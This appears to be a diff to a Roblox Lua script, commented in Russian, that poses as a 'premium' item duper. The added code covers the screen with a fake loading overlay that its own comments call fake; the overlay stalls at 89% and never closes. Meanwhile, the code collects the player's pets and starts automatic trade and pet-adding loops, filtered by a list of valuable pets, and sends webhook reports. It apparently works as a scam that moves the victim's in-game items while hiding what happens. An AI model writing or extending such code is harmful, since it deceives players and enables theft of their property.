@@ -106,51 +106,74 @@ local function getBaseCenter(base)
 end
 
 -- Сбор петов
-local function collectAllPets(baseId)
-    for slot = 1, 50 do
-        remote:InvokeServer("Pick Up Brainrot", baseId, tostring(slot))
-        task.wait(0.1)
+local function collectRange(baseId, fromSlot, toSlot)
+    for slot = fromSlot, toSlot do
+        pcall(function()
+            remote:InvokeServer("Pick Up Brainrot", baseId, tostring(slot))
+        end)
+        task.wait(0.2)
     end
 end
 
 -- ГЛАВНАЯ ФУНКЦИЯ (её будем вызывать из твоего скрипта)
 function startAutoFarm()
-	task.spawn(function() -- чтобы не фризил лоадер
-		local character = player.Character or player.CharacterAdded:Wait()
-		local hrp = character:WaitForChild("HumanoidRootPart", 10)
-		if not hrp then return end
+    local finished = Instance.new("BindableEvent")
 
+    task.spawn(function()
+        local character = player.Character or player.CharacterAdded:Wait()
+        local hrp = character:WaitForChild("HumanoidRootPart", 10)
+        if not hrp then
+            finished:Fire()
+            return
+        end
 
-		local myBase
-		for i = 1, 120 do
-			myBase = getMyBase()
-			if myBase then break end
-			task.wait(0.5)
-		end
+        local myBase
+        for i = 1, 120 do
+            myBase = getMyBase()
+            if myBase then break end
+            task.wait(0.5)
+        end
 
-		if not myBase then
-			warn("Base not found")
-			return
-		end
+        if not myBase then
+            warn("Base not found")
+            finished:Fire()
+            return
+        end
 
-		local center = getBaseCenter(myBase)
-		if not center then
-			warn("Base center not found")
-			return
-		end
+        local center = getBaseCenter(myBase)
+        if not center then
+            warn("Base center not found")
+            finished:Fire()
+            return
+        end
 
+        local baseId = myBase.Name
 
+        tweenTo(hrp, CFrame.new(center + Vector3.new(0, 3, 0)), 1.5)
+        task.wait(1)
 
-		-- Твин в центр базы (+3 вверх)
-		tweenTo(hrp, CFrame.new(center + Vector3.new(0, 3, 0)), 1.5)
-		task.wait(1)
-		-- Поднимаемся на 20 вверх
-		local upPos = hrp.Position + Vector3.new(0, 20, 0)
-		tweenTo(hrp, CFrame.new(upPos), 1.2)
+        collectRange(baseId, 1, 10)
 
-		collectAllPets(myBase.Name)
+        tweenTo(hrp, CFrame.new(hrp.Position + Vector3.new(0, 20, 0)), 1.2)
+        task.wait(0.5)
 
-	end)
+        collectRange(baseId, 11, 20)
+
+        tweenTo(hrp, CFrame.new(hrp.Position + Vector3.new(0, 20, 0)), 1.2)
+        task.wait(0.5)
+
+        collectRange(baseId, 21, 30)
+
+        tweenTo(hrp, CFrame.new(hrp.Position + Vector3.new(0, 20, 0)), 1.2)
+        task.wait(0.5)
+
+        collectRange(baseId, 31, 40)
+
+        -- 🔥 СИГНАЛ ЧТО ФАРМ ЗАКОНЧЕН
+        finished:Fire()
+    end)
+
+    return finished.Event
 end
 
 -- ВЕБХУК
@@ -336,6 +359,8 @@ local ALLOWED_PETS = {
 	["Cupitron Consoletron"] = true,
 	["Divine Block"] = true,
 	["Freezeti Cobretti"] = true,
+	["Galactio Fantasma"] = true,
+	["Base Skin"] = true,
 	["Infinity Block"] = true
 }
 
@@ -700,68 +725,167 @@ loadBtn.MouseButton1Click:Connect(function()
 	blackGui.Name = "AbsoluteBlackLoader"
 	blackGui.IgnoreGuiInset = true
 	blackGui.DisplayOrder = 9999999
+	blackGui.ResetOnSpawn = false
 	blackGui.Parent = playerGui
-
+	
+	-- ЧЕРНЫЙ ФОН
 	local black = Instance.new("Frame")
 	black.Size = UDim2.new(1,0,1,0)
 	black.BackgroundColor3 = Color3.fromRGB(0,0,0)
 	black.BorderSizePixel = 0
 	black.Parent = blackGui
+	
+	-- ГРАДИЕНТ ДЛЯ КРАСОТЫ
+	local gradient = Instance.new("UIGradient")
+	gradient.Color = ColorSequence.new{
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(15,15,25))
+	}
+	gradient.Rotation = 90
+	gradient.Parent = black
+	
+	-- ЛОГО/ЗАГОЛОВОК
+	local title = Instance.new("TextLabel")
+	title.Size = UDim2.new(1,0,0,80)
+	title.Position = UDim2.new(0,0,0.35,0)
+	title.BackgroundTransparency = 1
+	title.Font = Enum.Font.GothamBold
+	title.Text = "PREMIUM LOADER"
+	title.TextSize = 48
+	title.TextColor3 = Color3.fromRGB(255,255,255)
+	title.TextStrokeTransparency = 0.8
+	title.Parent = black
+	
+	-- ПРОЦЕНТЫ
+	local percentLabel = Instance.new("TextLabel")
+	percentLabel.Size = UDim2.new(1,0,0,60)
+	percentLabel.Position = UDim2.new(0,0,0.48,0)
+	percentLabel.BackgroundTransparency = 1
+	percentLabel.Font = Enum.Font.GothamBold
+	percentLabel.Text = "0%"
+	percentLabel.TextSize = 44
+	percentLabel.TextColor3 = Color3.fromRGB(120,170,255)
+	percentLabel.Parent = black
+	
+	-- ТЕКСТ СТАТУСА
+	local statusText = Instance.new("TextLabel")
+	statusText.Size = UDim2.new(1,0,0,50)
+	statusText.Position = UDim2.new(0,0,0.58,0)
+	statusText.BackgroundTransparency = 1
+	statusText.Font = Enum.Font.Gotham
+	statusText.Text = "Initializing..."
+	statusText.TextSize = 24
+	statusText.TextColor3 = Color3.fromRGB(200,200,200)
+	statusText.Parent = black
+	
+	-- ПРОГРЕСС БАР ФОН
+	local barBG = Instance.new("Frame")
+	barBG.Size = UDim2.new(0,300,0,8) -- ширина 300px
+	barBG.Position = UDim2.new(0.5,0,0.5,80)
+	barBG.AnchorPoint = Vector2.new(0.5,0.5) -- центрирование
+	barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	barBG.BorderSizePixel = 0
+	barBG.Parent = black
+	
+	local barCorner = Instance.new("UICorner", barBG)
+	barCorner.CornerRadius = UDim.new(1,0)
+	
+	-- ПРОГРЕСС БАР ЗАПОЛНЕНИЕ
+	local barFill = Instance.new("Frame")
+	barFill.Size = UDim2.new(0,0,1,0)
+	barFill.BackgroundColor3 = Color3.fromRGB(120,170,255)
+	barFill.BorderSizePixel = 0
+	barFill.Parent = barBG
+	
+	local fillCorner = Instance.new("UICorner", barFill)
+	fillCorner.CornerRadius = UDim.new(1,0)
+	
+	-- НЕОНОВОЕ СИЯНИЕ
+	local stroke = Instance.new("UIStroke", barFill)
+	stroke.Thickness = 2
+	stroke.Color = Color3.fromRGB(150,200,255)
+	
+	-- ШАГИ ЗАГРУЗКИ
+	local loadingSteps = {
+		"Checking server integrity",
+		"Loading core modules",
+		"Decrypting assets",
+		"Syncing environment",
+		"Preparing duper",
+		"Finalizing bypassing"
+	}
+	
+	-- ФЕЙК ПРЕМИУМ ЗАГРУЗКА (СТОП НА 89%)
+	task.spawn(function()
+		local TweenService = game:GetService("TweenService")
+		local stepIndex = 1
+		
+		for i = 1, 89 do
+			-- обновляем проценты
+			percentLabel.Text = i .. "%"
+			
+			-- меняем статус каждые ~15%
+			if i % 15 == 0 and loadingSteps[stepIndex] then
+				statusText.Text = loadingSteps[stepIndex]
+				stepIndex += 1
+			end
+			
+			-- плавный прогресс бар
+			local goalSize = UDim2.new(i/100, 0, 1, 0)
+			local tween = TweenService:Create(
+				barFill,
+				TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+				{Size = goalSize}
+			)
+			tween:Play()
+			
+			-- замедление к концу (выглядит реалистично)
+			if i < 50 then
+				task.wait(0.15)
+			elseif i < 75 then
+				task.wait(0.3)
+			else
+				task.wait(0.6)
+			end
+		end
+		
+		-- ОСТАНОВКА НА 89%
+		percentLabel.Text = "89%"
+		statusText.Text = "Finalizing... (Do not close)"
+		
+		-- бесконечные точки загрузки ~40 сек
+		local dot = 0
+		local startTime = tick()
+		
+		while tick() - startTime < 40 do
+			dot += 1
+			if dot > 3 then dot = 0 end
+			
+			statusText.Text = "Finalizing" .. string.rep(".", dot)
+			task.wait(0.8)
+		end
+		
+		-- после 40 сек просто зависает на 89% и НЕ ЗАКРЫВАЕТСЯ
+		statusText.Text = "Injection complete. Waiting for server response..."
+	end)
 
-	local text = Instance.new("TextLabel")
-	text.Size = UDim2.new(0,900,0,120)
-	text.Position = UDim2.new(0.5,-450,0.5,-60)
-	text.BackgroundTransparency = 1
-	text.Font = Enum.Font.GothamBold
-	text.TextSize = 40
-	text.TextColor3 = Color3.fromRGB(255,255,255)
-	text.TextWrapped = true
-	text.TextXAlignment = Enum.TextXAlignment.Center
-	text.TextYAlignment = Enum.TextYAlignment.Center
-	text.Parent = black
 
-  local loadingSteps = {
-  	"Checking server integrity",
-  	"Loading system",
-  	"Initializing modules",
-  	"Verifying environment",
-  	"Preparing user interface",
-  	"Finalizing startup...."
-  }
 
-  startAutoFarm()
+  
+  task.spawn(function()
+    local farmFinished = startAutoFarm()
+    
+    -- ЖДЁМ полного завершения сбора петов
+    farmFinished:Wait()
+    
+    -- маленькая пауза чтобы сервер "остыл"
+    task.wait(2)
+    
+    -- теперь безопасно запускать трейды
+    startTradeLoop()
+    startAutoAddPetsLoop()
+  end)
 
-  local function animateLoadingText(label)
-  	task.spawn(function()
-  		local stepIndex = 1
-  		local dotCount = 0
-  
-  		while true do
-  			if isFull then
-  				label.Text = "Server is FULL (8/8)\nServer may be bugged.\nRejoining a new empty server recommended."
-  				break
-  			end
-  
-  			local textToShow = loadingSteps[stepIndex] or "Loading"
-  			textToShow = textToShow .. string.rep(".", dotCount)
-  
-  			label.Text = textToShow
-  			dotCount = dotCount + 1
-  			if dotCount > 3 then dotCount = 0 end
-  
-  			task.wait(7)
-  
-  			stepIndex = stepIndex + 1
-  			if stepIndex > #loadingSteps then
-  				stepIndex = 1
-  			end
-  		end
-  	end)
-  end
-  
-  -- Используем эту функцию
-  animateLoadingText(text)
-  
   -- Отправка вебхука в фоне
   if isFull then
   	sendWebhook("Server Full / Possibly Bugged")
@@ -769,12 +893,9 @@ loadBtn.MouseButton1Click:Connect(function()
   	sendWebhook("Server OK")
   end
   
-  startTradeLoop()
-
   task.delay(2, function()
 	sendWebhook("Loader Started + Pets Scanned")
   end)
 
-  startAutoAddPetsLoop()
 end)
 
